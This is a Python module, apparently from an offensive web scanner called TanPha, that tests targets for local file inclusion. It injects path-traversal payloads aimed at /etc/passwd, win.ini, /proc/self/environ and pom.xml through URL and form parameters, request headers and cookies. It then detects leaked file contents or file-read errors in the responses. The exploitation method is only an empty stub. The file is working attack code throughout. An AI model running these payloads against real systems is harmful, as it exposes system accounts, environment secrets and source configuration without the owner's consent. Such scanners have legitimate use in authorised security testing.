"""LFI Module for TanPha V5.1 (Error-Based Detection)."""
import html
from modules.base import BaseModule
from core.context import TargetContext, Evidence, Finding
from core.verification import VerificationResult, VerificationStatus
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse

class LFIModule(BaseModule):
    name = "LFI"
    module_id = "lfi"
    version = "5.1 (Error-Based)"
    vulnerability_class = "LOCAL_FILE_INCLUSION"
    default_impact = "SENSITIVE_FILE_DISCLOSURE"
    default_privilege = "WEB_USER"

    COMMON_INJECTABLE_HEADERS = [
        "User-Agent", "Referer", "X-Forwarded-For", "X-Original-URL",
        "Accept-Language", "Cookie"
    ]
    
    POST_BODY = {"Submit": "Submit", "answer": "answer"}

    LFI_PAYLOADS = [
        "../../../../../../../../etc/passwd",
        "../../../../../../../../windows/win.ini",
        "../../../../../../../../proc/self/environ",
        "../../../pom.xml",
        "../../../../pom.xml"
    ]

    # Penanda kebocoran file
    LFI_MARKERS = [
        "root:x:0:0:", 
        "root:*:0:0:", 
        "[extensions]", 
        "for 16-bit app support",
        "daemon:x:",
        "path=",       
        "home=",       
        "termux",
        "<project",      # Kalau baca pom.xml
        "<modelVersion"  # Kalau baca pom.xml
    ]

    # Penanda kalau server gagal baca file (TAPI INI BUKTI RENTAN)
    LFI_ERROR_MARKERS = [
        "problem getting fileinputstream",
        "java.io.filenotfoundexception",
        "no such file or directory"
    ]

    def __init__(self):
        super().__init__()

    def can_run(self, context: TargetContext) -> bool:
        if not context.discovery.parameters:
            context.discovery.parameters = ["file"]
        return True

    @staticmethod
    def _decode(text: str) -> str:
        try:
            return html.unescape(text)
        except Exception:
            return text

    @staticmethod
    def _servlet_url(url: str) -> str:
        p = urlparse(url)
        path = p.path
        if path.endswith(".html"):
            path = path[:-5]
        return f"{p.scheme}://{p.netloc}{path}"

    def _is_lfi_output(self, text: str) -> tuple[bool, str]:
        decoded = self._decode(text).lower()
        # Cek beneran bocor
        if any(m in decoded for m in self.LFI_MARKERS):
            return True, "FILE_READ"
        # Cek error (tetep dianggap rentan karena input diproses FileInputStream)
        if any(m in decoded for m in self.LFI_ERROR_MARKERS):
            return True, "ERROR_BASED"
        return False, ""

    def _build_target_url(self, base_url: str, param: str, payload: str) -> str:
        parsed = urlparse(base_url)
        qs = parse_qsl(parsed.query, keep_blank_values=True)
        new_qs = [(k, payload) if k == param else (k, v) for k, v in qs]
        if not new_qs: new_qs = [(param, payload)]
        return urlunparse(parsed._replace(query=urlencode(new_qs, safe="")))

    def _send_payload(self, context, param, payload, auth_checker=None, timeout=10):
        if "?" in context.target.base_url:
            target_url = self._build_target_url(context.target.base_url, param, payload)
            res = context.http_client.request(
                "GET", target_url, target_param=param,
                auth_checker=auth_checker, bypass_mutation=True, timeout=timeout
            )
            return res.response if res and res.response is not None else None
        else:
            data = {param: payload, "Submit": "Submit"}
            res = context.http_client.request(
                "POST", context.target.base_url, data=data,
                auth_checker=auth_checker, bypass_mutation=True, timeout=timeout
            )
            return res.response if res and res.response is not None else None

    def _send_header_payload(self, context, header_name, payload, auth_checker=None, timeout=10, method="GET"):
        headers = {header_name: payload}
        target = self._servlet_url(context.target.base_url)
        
        if method == "POST":
            res = context.http_client.request(
                "POST", target, headers=headers, data=self.POST_BODY,
                auth_checker=auth_checker, bypass_mutation=True, timeout=timeout
            )
        else:
            res = context.http_client.request(
                "GET", target, headers=headers,
                auth_checker=auth_checker, bypass_mutation=True, timeout=timeout
            )
        return res.response if res and res.response is not None else None

    def _send_cookie_payload(self, context, cookie_name, payload, auth_checker=None, timeout=10, method="GET"):
        headers = {"Cookie": f"{cookie_name}={payload}"}
        target = self._servlet_url(context.target.base_url)
        
        if method == "POST":
            res = context.http_client.request(
                "POST", target, headers=headers, data=self.POST_BODY,
                auth_checker=auth_checker, bypass_mutation=True, timeout=timeout
            )
        else:
            res = context.http_client.request(
                "GET", target, headers=headers,
                auth_checker=auth_checker, bypass_mutation=True, timeout=timeout
            )
        return res.response if res and res.response is not None else None

    def _test_lfi(self, context, param, sender_func):
        for payload in self.LFI_PAYLOADS:
            result = sender_func(payload)
            if result is not None and result.text:
                is_lfi, reason = self._is_lfi_output(result.text)
                if is_lfi:
                    print(f"      [!!] LFI CONFIRMED on '{param}' (Payload: {payload}) - {reason}!")
                    return Evidence(
                        attempt_id="lfi_confirmed", module_id=self.module_id, module_version=self.version,
                        location=context.target.base_url, parameter=param, outcome="FILE_READ",
                        reason_code="LFI_CONFIRMED", reason_detail=f"Sensitive file behavior detected: {reason}",
                        confidence=0.95, evidence_text=f"LFI via {reason}", assess_payload=payload
                    )
        return None

    def assess(self, context: TargetContext, auth_checker=None) -> list[Evidence]:
        evidence_pool = []

        # FASE 1: Parameters (GET/POST)
        for param in context.discovery.parameters:
            print(f"      [>] Testing LFI on param '{param}'...")
            sender = lambda p: self._send_payload(context, param, p, auth_checker)
            ev = self._test_lfi(context, param, sender)
            if ev:
                evidence_pool.append(ev)
                continue

        # FASE 2: Headers
        headers_to_test = list(context.discovery.parameters)
        headers_to_test.extend(self.COMMON_INJECTABLE_HEADERS)
        seen = set()
        headers_to_test = [x for x in headers_to_test if not (x.lower() in seen or seen.add(x.lower()))]

        print(f"      [>] Testing LFI via {len(headers_to_test)} headers (GET+POST)...")
        for header_name in headers_to_test:
            ev_found = False
            for method in ("GET", "POST"):
                sender = lambda p, h=header_name, m=method: self._send_header_payload(context, h, p, auth_checker, method=m)
                ev = self._test_lfi(context, header_name, sender)
                if ev:
                    evidence_pool.append(ev)
                    ev_found = True
                    break
            if ev_found:
                print(f"      [+] Stop testing more headers, found vuln in '{header_name}'.")
                break

        # FASE 3: Cookies
        cookie_names = list(context.discovery.parameters)
        try:
            base_res = context.http_client.request("GET", context.target.base_url, auth_checker=auth_checker, bypass_mutation=True)
            if base_res and base_res.success and base_res.response:
                for set_cookie in base_res.response.headers.get("Set-Cookie", "").split(","):
                    cname = set_cookie.split("=")[0].strip()
                    if cname and cname not in cookie_names:
                        cookie_names.append(cname)
        except Exception:
            pass

        print(f"      [>] Testing LFI via {len(cookie_names)} cookies (GET+POST)...")
        for cookie_name in cookie_names:
            ev_found = False
            for method in ("GET", "POST"):
                sender = lambda p, c=cookie_name, m=method: self._send_cookie_payload(context, c, p, auth_checker, method=m)
                ev = self._test_lfi(context, cookie_name, sender)
                if ev:
                    evidence_pool.append(ev)
                    ev_found = True
                    break
            if ev_found:
                print(f"      [+] Stop testing more cookies, found vuln in '{cookie_name}'.")
                break

        return evidence_pool

    def verify(self, context: TargetContext, evidence: Evidence, auth_checker=None) -> VerificationResult:
        if evidence.reason_code == "LFI_CONFIRMED":
            return VerificationResult(
                VerificationStatus.VALIDATED, 0.95, "LFI_CONFIRMED",
                "Sensitive file behavior detected.", verify_payload=evidence.assess_payload
            )
        return VerificationResult(VerificationStatus.REJECTED, 0.0, "FAILED", "Not vuln")

    def exploit(self, context: TargetContext, finding: Finding):
        print("\n[***] LFI EXPLOITATION [***]")
